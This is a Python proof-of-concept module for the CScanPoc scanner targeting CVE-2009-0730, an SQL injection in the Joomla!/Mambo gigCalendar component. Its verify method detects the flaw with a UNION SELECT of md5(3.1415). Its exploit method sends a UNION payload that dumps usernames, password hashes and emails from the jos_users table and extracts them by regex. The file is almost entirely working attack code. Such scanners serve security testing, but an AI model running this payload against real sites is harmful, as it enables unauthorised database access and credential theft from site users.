# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import re

class Vuln(ABVuln):
    poc_id = '163a922b-4b30-4842-9933-53ff066caac8'
    name = 'Joomla! and Mambo gigCalendar Component 1.0 banddetails.php SQL Injection Vulnerability' # 漏洞名称
    level = VulnLevel.HIGH # 漏洞危害级别
    type = VulnType.INJECTION # 漏洞类型
    disclosure_date = '2009-02-24'  # 漏洞公布时间
    desc = '''
        gigCalendar是一个免费的为维护网站旅游日志的的Joomla! and Mambo组件。
        Mambo和Joomla! GigCalendar (com_gigcal)组件中存在多个SQL注入漏洞。
    ''' # 漏洞描述
    ref = 'https://www.seebug.org/vuldb/ssvid-86077' # 
    cnvd_id = 'Unknown' # cnvd漏洞编号
    cve_id = 'CVE-2009-0730'  # cve编号
    product = 'Joomla!'  # 漏洞组件名称
    product_version = 'Joomla! and Mambo gigCalendar Component 1.0'  # 漏洞应用版本

class Poc(ABPoc):
    poc_id = '77a6f71d-2afa-448c-8c88-551afe0bb40f' # 平台 POC 编号
    author = '国光'  # POC编写者
    create_date = '2018-06-01' # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            arg = '{target}'.format(target=self.target)
            #访问的地址
            exploit='/index.php?option=com_gigcal&task=details&gigcal_bands_id='
            #利用union的方式（计算md5(3.1415)）
            payload="-1' UNION ALL SELECT 1,2,3,4,5,md5(3.1415),NULL,NULL,NULL,NULL,NULL,NULL,NULL%23"
            #构造漏洞利用连接
            vulurl=arg+exploit+payload
            #自定义的HTTP头
            httphead = {
            'User-Agent':'Mozilla/5.0 (Windows NT 6.2; rv:16.0) Gecko/20100101 Firefox/16.0',
            'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Connection':'keep-alive'
            }
            #发送请求
            resp=requests.get(url=vulurl,headers=httphead,timeout=50)
            #检查是否含有特征字符串(md5(3.1415)=63e1f04640e83605c1d177544a5a0488)
            if '63e1f04640e83605c1d177544a5a0488' in resp.content:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(target=self.target, name=self.vuln.name))
            
        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 漏洞利用'.format(
                    target=self.target, vuln=self.vuln))
            arg = '{target}'.format(target=self.target)
            #访问的地址
            exploit='/index.php?option=com_gigcal&task=details&gigcal_bands_id='
            #利用Union方式读取信息
            payload="-1' UNION ALL SELECT 1,2,3,4,5,concat(0x247e7e7e24,username,"\
            "0x2a2a2a,password,0x2a2a2a,email,0x247e7e7e24),NULL,NULL,NULL,NULL,NULL,NULL,NULL from jos_users%23"
            #构造漏洞利用连接
            vulurl=arg+exploit+payload
            #自定义的HTTP头
            httphead = {
            'User-Agent':'Mozilla/5.0 (Windows NT 6.2; rv:16.0) Gecko/20100101 Firefox/16.0',
            'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Connection':'keep-alive'
            }
            #提取信息的正则表达式
            parttern='\$~~~\$(.*)\*\*\*(.*)\*\*\*(.*)\$~~~\$'
            #发送请求
            resp=requests.get(url=vulurl,headers=httphead,timeout=50)
            #检查是否含有特征字符串
            if '$~~~$' in resp.content:
                #提取信息
                match=re.search(parttern,resp.content,re.M|re.I)
                if match:
                    username = match.group(1)
                    password = match.group(2)
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞，获取到的用户名为{username} 密码为{password}'.format(target=self.target,name=self.vuln.name,username=username,password=password))
        except Exception, e:
            self.output.info('执行异常{}'.format(e))

if __name__ == '__main__':
    Poc().run()